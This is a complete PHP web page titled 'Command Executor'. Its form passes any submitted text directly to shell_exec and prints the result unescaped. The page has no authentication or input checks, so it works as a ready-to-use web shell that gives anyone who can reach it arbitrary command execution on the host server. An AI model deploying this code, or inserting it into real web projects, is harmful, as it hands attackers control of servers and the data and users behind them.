<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
</head>
<body>
    <h1>Command Executor</h1>

    <form method="post" action="">
        <label for="command">Enter command:</label>
        <input type="text" id="command" name="command" required>
        <button type="submit">Execute</button>
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        $command = $_POST["command"];
        $output = "";

        // Execute the command
        if (trim($command) !== "") {
            $output = shell_exec($command);
        }
    ?>
        <h2>Command Output:</h2>
        <pre><?php echo $output; ?></pre>
    <?php
    }
    ?>
</body>
</html>
